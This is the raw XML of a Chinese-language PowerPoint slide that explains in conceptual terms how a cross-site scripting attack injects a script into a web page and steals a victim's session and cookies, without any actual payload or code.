          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2268538" y="1341438"/>
            <a:ext cx="3671887" cy="2087562"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425986" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755650" y="44450"/>
            <a:ext cx="7129463" cy="792163"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击的原理</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425988" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6996113" y="4292600"/>
            <a:ext cx="1752600" cy="750888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:no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带有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>漏洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>程序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25990" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5754688" y="2709863"/>
            <a:ext cx="1066800" cy="733425"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="57150">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="425991" name="Picture 7" descr="TN_hacker"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2" cstate="print">
            <a:lum bright="24000" contrast="42000"/>
          </a:blip>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="1763713"/>
            <a:ext cx="1093787" cy="1268412"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:srgbClr val="808080">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425994" name="Line 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5881688" y="3860800"/>
            <a:ext cx="1066800" cy="801688"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="57150">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425997" name="Rectangle 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3276600" y="2276475"/>
            <a:ext cx="2560638" cy="587375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFCC"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="tx1"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>攻击者将恶意脚本输入到服务器上的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>页面</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 30"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1639888" y="936625"/>
            <a:ext cx="2500312" cy="417513"/>
            <a:chOff x="1033" y="590"/>
            <a:chExt cx="1575" cy="263"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425995" name="Rectangle 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1321" y="590"/>
              <a:ext cx="1287" cy="227"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="342900" indent="-342900">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攻击者设置陷阱 </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25998" name="Oval 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1033" y="618"/>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1</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 31"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1639888" y="3560763"/>
            <a:ext cx="4587875" cy="373062"/>
            <a:chOff x="1033" y="2243"/>
            <a:chExt cx="2890" cy="235"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425993" name="Oval 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1033" y="2243"/>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2</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425999" name="Rectangle 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="1338" y="2251"/>
              <a:ext cx="2585" cy="168"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="342900" indent="-342900">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受害者浏览页面 </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="Group 32"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="6021388"/>
            <a:ext cx="5735637" cy="444500"/>
            <a:chOff x="537" y="3785"/>
            <a:chExt cx="3613" cy="280"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="425992" name="Oval 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="537" y="3785"/>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3</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426000" name="Rectangle 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="916" y="3793"/>
              <a:ext cx="3234" cy="272"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr marL="342900" indent="-342900">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脚本将受害者的</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>Session</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>、</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>Cookie</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
                </a:rPr>
                <a:t>发送给攻击者  </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426001" name="Rectangle 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3133725" y="4826000"/>
            <a:ext cx="2590800" cy="835025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFCC"/>
          </a:solidFill>
          <a:ln w="9525" algn="ctr">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="50000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="tx1"/>
              </a:buClr>
              <a:buSzPct val="90000"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>运行于受害者浏览器的脚本可以完全访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>和 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>cookies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="CC0000"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6932613" y="2852738"/>
            <a:ext cx="1455737" cy="1412875"/>
            <a:chOff x="4336" y="1870"/>
            <a:chExt cx="917" cy="890"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426003" name="Rectangle 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm>
              <a:off x="4336" y="2616"/>
              <a:ext cx="917" cy="144"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="008000"/>
            </a:solidFill>
            <a:ln w="12700">
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>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Custom Code</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426004" name="Rectangle 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4023"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Accounts</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426005" name="Rectangle 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4139"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Finance</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426006" name="Rectangle 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="426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Administration</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426007" name="Rectangle 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4375"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Transactions</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426008" name="Rectangle 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4498"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Communication</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426009" name="Rectangle 25"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4609"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Knowledge Mgmt</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426010" name="Rectangle 26"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="4725"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E-Commerce</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="426011" name="Rectangle 27"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="ltGray">
            <a:xfrm rot="16200000">
              <a:off x="484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Bus. Functions</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="426012" name="Picture 28" descr="businesswoman"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="4178300"/>
            <a:ext cx="1050925" cy="1255713"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:effectLst>
            <a:outerShdw dist="107763" dir="2700000" algn="ctr" rotWithShape="0">
              <a:srgbClr val="808080">
                <a:alpha val="50000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426013" name="Freeform 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="323850" y="2676525"/>
            <a:ext cx="2768600" cy="3235325"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="1744" y="1704"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="976" y="2184"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="160" y="2184"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="16" y="1320"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="64" y="216"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="352" y="24"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1744" h="2328">
                <a:moveTo>
                  <a:pt x="1744" y="1704"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1492" y="1904"/>
                  <a:pt x="1240" y="2104"/>
                  <a:pt x="976" y="2184"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="712" y="2264"/>
                  <a:pt x="320" y="2328"/>
                  <a:pt x="160" y="2184"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="0" y="2040"/>
                  <a:pt x="32" y="1648"/>
                  <a:pt x="16" y="1320"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="0" y="992"/>
                  <a:pt x="8" y="432"/>
                  <a:pt x="64" y="216"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="120" y="0"/>
                  <a:pt x="236" y="12"/>
                  <a:pt x="352" y="24"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">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60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25997"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromBottom)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
